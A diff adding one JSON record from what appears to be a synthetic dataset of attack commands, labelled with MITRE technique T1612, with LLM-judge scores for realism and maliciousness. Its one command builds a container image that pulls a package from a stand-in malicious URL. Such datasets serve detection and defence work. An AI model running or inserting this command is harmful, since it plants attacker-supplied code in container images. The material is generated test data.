@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1612",
+  "platform": "linux",
+  "shell": "bash",
+  "command": "nerdctl build -t infected_image --build-arg INFECTED_PACKAGE=http://malicious.domain/package.zip -f Dockerfile .",
+  "explanation": "Directly instructs the Docker build process to incorporate a ZIP package from a malicious source, likely containing malware.",
+  "rationale_steps": [
+    "Specify a malicious URL for a package during the build process.",
+    "Automatically incorporates the malicious package into the Docker image."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1612-10680f09-a729169b",
+  "source_prompt_hash": "10680f09",
+  "timestamp_utc": "2025-07-10T23:22:27.254988Z",
+  "validation": {
+    "syntax_ok": {
+      "pass": true,
+      "forbidden_tokens": false,
+      "obfuscation_suspicious": false,
+      "obfuscation_entropy": 4.93,
+      "command_length": 112
+    },
+    "llm_judgments": [
+      {
+        "model": "gpt-4-turbo",
+        "score": 0.96,
+        "category_fit": 1.0,
+        "attack_realism": 0.95,
+        "maliciousness": 1.0,
+        "technical_plausibility": 1.0,
+        "privilege_relevance": 0.7,
+        "reason": "The sample perfectly fits the description of T1612, featuring malicious image building on a host; it's realistic and technically plausible but does not require elevated privileges.",
+        "timestamp": "2025-07-12T18:34:21.018857Z"
+      },
+      {
+        "model": "claude-3-opus-20240229",
+        "category_fit": 1.0,
+        "attack_realism": 0.9,
+        "maliciousness": 0.8,
+        "technical_plausibility": 1.0,
+        "privilege_relevance": 0.9,
+        "score": 0.93,
+        "reason": "The command perfectly demonstrates the technique of building a malicious container image on-host using standard container build tooling with a malicious package argument.",
+        "timestamp": "2025-07-14T04:32:56.042683Z"
+      }
+    ],
+    "llm_average_submetrics": {
+      "category_fit": 1.0,
+      "attack_realism": 0.925,
+      "maliciousness": 0.9,
+      "technical_plausibility": 1.0,
+      "privilege_relevance": 0.8
+    },
+    "llm_average_score": 0.945,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
